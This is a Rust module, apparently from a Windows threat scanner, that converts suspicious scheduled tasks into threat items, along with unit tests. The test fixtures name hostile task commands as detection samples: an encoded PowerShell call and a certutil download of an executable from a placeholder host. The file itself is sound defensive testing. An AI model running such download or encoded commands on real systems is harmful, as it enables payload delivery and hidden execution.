//! Taches planifiees : meme analyse que la page Taches (`commands::tasks`), pour qu'une
//! tache ne soit jamais suspecte d'un cote et saine de l'autre.

use crate::commands::tasks::{get_scheduled_tasks_sync, suspicious_severity, ScheduledTaskInfo};
use crate::commands::threat_scanner::{ScanOutcome, ThreatItem};

pub(super) fn threats_from_tasks(tasks: &[ScheduledTaskInfo]) -> Vec<ThreatItem> {
    tasks
        .iter()
        .filter(|t| t.is_suspicious)
        .map(|t| ThreatItem {
            name: t.name.clone(),
            category: "Tâches planifiées".into(),
            severity: suspicious_severity(t).into(),
            description: format!("Tâche planifiée suspecte. {}", t.suspicious_reason),
            path: format!("{}{}", t.path, t.name),
            can_fix: true,
            fix_id: format!("task_{}", t.name.replace(' ', "_")),
        })
        .collect()
}

pub(crate) fn scan_scheduled_tasks() -> ScanOutcome {
    let tasks = get_scheduled_tasks_sync().map_err(|e| format!("Tâches planifiées: {}", e.friendly_message()))?;
    Ok((tasks.len() as u32, threats_from_tasks(&tasks)))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn task(name: &str, author: &str, exe: &str, args: &str) -> ScheduledTaskInfo {
        let mut t = ScheduledTaskInfo {
            name: name.into(),
            path: "\\Fixture\\".into(),
            state: "Ready".into(),
            author: author.into(),
            description: String::new(),
            last_run_time: String::new(),
            next_run_time: String::new(),
            action_path: exe.into(),
            action_arguments: args.into(),
            is_suspicious: false,
            needs_review: false,
            suspicious_reason: String::new(),
        };
        crate::commands::tasks::analyze_suspicious(&mut t);
        t
    }

    #[test]
    fn a_task_the_tasks_page_calls_healthy_is_not_a_threat() {
        let tasks = [
            task("Maintenance", "Microsoft Corporation", r"C:\Windows\System32\rundll32.exe", "shell32.dll,Run"),
            task("Planifiee", "Vendor", r"C:\Program Files\Vendor\tool.exe", ""),
            task("Script", "", "powershell.exe", "-File job.ps1"),
        ];
        assert!(threats_from_tasks(&tasks).is_empty());
    }

    #[test]
    fn a_strong_indicator_is_a_threat_with_the_severity_of_its_pattern() {
        let tasks = [
            task("Encodee", "Vendor", "powershell.exe", "-enc AAAA"),
            task("Telechargeur", "Vendor", "certutil.exe", "-urlcache -f http://example.invalid/a a.exe"),
            task("Script", "Vendor", "wscript.exe", "job.vbs"),
        ];
        let threats = threats_from_tasks(&tasks);
        let severities: Vec<(&str, &str)> = threats.iter().map(|t| (t.name.as_str(), t.severity.as_str())).collect();
        assert_eq!(severities, vec![("Encodee", "critical"), ("Telechargeur", "high"), ("Script", "medium")]);
        assert!(threats.iter().all(|t| t.category == "Tâches planifiées" && t.description.contains("Motif suspect")));
    }

    #[test]
    fn the_scanner_flags_exactly_the_tasks_the_page_flags() {
        let tasks = [
            task("A", "Vendor", "mshta.exe", "x"),
            task("B", "Microsoft", "rundll32.exe", "x"),
            task("C", "Vendor", "cmd.exe", "/c dir"),
        ];
        let page: Vec<&str> = tasks.iter().filter(|t| t.is_suspicious).map(|t| t.name.as_str()).collect();
        let scan = threats_from_tasks(&tasks);
        let scanned: Vec<&str> = scan.iter().map(|t| t.name.as_str()).collect();
        assert_eq!(scanned, page);
    }
}
